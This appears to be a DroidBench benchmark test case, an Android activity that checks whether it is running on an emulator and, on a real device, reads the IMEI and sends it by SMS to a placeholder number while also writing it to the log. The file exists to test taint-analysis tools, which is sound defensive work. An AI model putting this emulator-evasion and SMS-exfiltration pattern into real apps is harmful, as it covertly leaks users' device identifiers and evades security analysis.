package de.ecspride;

import android.content.Context;
import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

/**
 * @testcase_name EmulatorDetection_ContentProvider1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends the IMEI as an SMS message and writes it to the log file. Emulator detection
 * 		is performed on the IMEI and the app is killed if the IMEI is a 00..00 pattern.
 * @dataflow onCreate: imei -> SMS & Log 
 * @number_of_leaks 2
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		if (!MyContentProvider.isEmulator) {
	        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			String imei = telephonyManager.getDeviceId(); //source
	
			SmsManager sm = SmsManager.getDefault();
	    	String number = "+49 1234";
	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
	    	
	    	Log.v("DROIDBENCH", imei); // sink, potential leak
		}
	}

}
